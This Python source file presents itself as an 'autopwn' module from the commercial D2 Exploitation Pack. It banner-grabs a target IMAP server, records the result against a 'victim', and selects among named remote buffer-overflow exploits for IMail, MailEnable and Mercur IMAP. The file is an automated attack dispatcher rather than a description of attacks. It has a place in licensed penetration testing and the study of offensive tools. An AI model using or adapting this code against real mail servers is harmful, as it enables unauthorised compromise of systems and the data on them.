#! /usr/bin/env python

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2010
#

import autopwn
import net.banner
import xmlrpclib

class run(autopwn.run):

  CANVAS_EXPLOITS = {
    'IMail': ['IMAIL Imap4 stack overflow in Login field', 'imail_imap'],
    'MailEnable Enterprise': ['MailEnable IMAP Login overflow', 'mailenable_imap'],
    'Mercur Imap': ['Mercur Imap 5.0 Remote Buffer Overflow', 'vsploit_mercurimap'],
  }

  def exploit(self, target, port):
    banner = ''
    try:
      banner = net.banner.bannergrab(target, port)
    except xmlrpclib.Fault, fault:
      print fault.faultString
      return
    if banner:
      self.db.db_unique_info(self.victim, self.service, 'IMAP Banner', 'autopwn_imap', banner)
      self.log.debug('%s' % banner)
    self.check_exploits(banner)
